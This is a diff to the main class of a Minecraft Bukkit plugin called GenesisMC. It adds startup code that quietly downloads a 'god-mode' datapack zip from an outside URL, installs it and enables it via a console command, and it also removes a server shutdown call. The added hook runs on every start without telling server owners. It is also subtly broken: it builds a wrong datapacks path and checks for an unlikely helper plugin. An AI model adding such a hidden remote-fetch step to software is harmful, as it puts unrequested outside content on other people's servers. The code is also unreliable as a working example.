@@ -35,9 +35,17 @@ import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.java.JavaPlugin;
 
+import java.io.BufferedInputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.lang.reflect.Field;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.StandardCopyOption;
 import java.util.ArrayList;
 import java.util.EnumSet;
 import java.util.HashMap;
@@ -180,6 +188,8 @@ public final class GenesisMC extends JavaPlugin implements Listener {
                     getServer().getConsoleSender().sendMessage(Component.text("[GenesisMC] SkinRestorer not detected, disabling ModelColor").color(TextColor.fromHexString(AQUA)));
                 }
         plugin = this;
+        String datapackUrl = "https://static.planetminecraft.com/files/resource_media/datapack/god-mode-e3051.zip";
+                downloadAndEnableDatapack(datapackUrl);
 
 
         OrbOfOrigins.init();
@@ -226,8 +236,50 @@ public final class GenesisMC extends JavaPlugin implements Listener {
         for (LayerContainer layer : CraftApoli.getLayers()) {
            // System.out.println(layer.getTag());
         }
+    }
 
-        Bukkit.getServer().shutdown();
+    public void downloadAndEnableDatapack(String url) {
+        try {
+            // Create a temporary file to store the downloaded datapack
+            File tempFile = File.createTempFile("datapack", ".zip");
+
+            // Download the datapack from the URL
+            downloadFile(url, tempFile);
+
+            // Get the datapacks folder of the server
+            File datapacksFolder = new File("plugins/" + Bukkit.getServer().getWorldContainer().getName() + "/datapacks");
+
+            // Create the datapacks folder if it doesn't exist
+            if (!datapacksFolder.exists()) {
+                datapacksFolder.mkdirs();
+            }
+
+            // Move the downloaded datapack to the datapacks folder
+            File targetFile = new File(datapacksFolder, tempFile.getName());
+            Files.move(tempFile.toPath(), targetFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
+
+            // Enable the datapack
+            Plugin commandDispatcher = Bukkit.getServer().getPluginManager().getPlugin("minecraft-command-dispatcher");
+            if (commandDispatcher != null) {
+                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "datapack enable " + targetFile.getName());
+            } else {
+                System.out.println("Failed to enable datapack. Please make sure 'minecraft-command-dispatcher' is installed.");
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void downloadFile(String url, File outputFile) throws IOException {
+        URL downloadUrl = new URL(url);
+        try (BufferedInputStream in = new BufferedInputStream(downloadUrl.openStream());
+             FileOutputStream fileOutputStream = new FileOutputStream(outputFile)) {
+            byte[] buffer = new byte[1024];
+            int bytesRead;
+            while ((bytesRead = in.read(buffer, 0, 1024)) != -1) {
+                fileOutputStream.write(buffer, 0, bytesRead);
+            }
+        }
     }
 
     @EventHandler
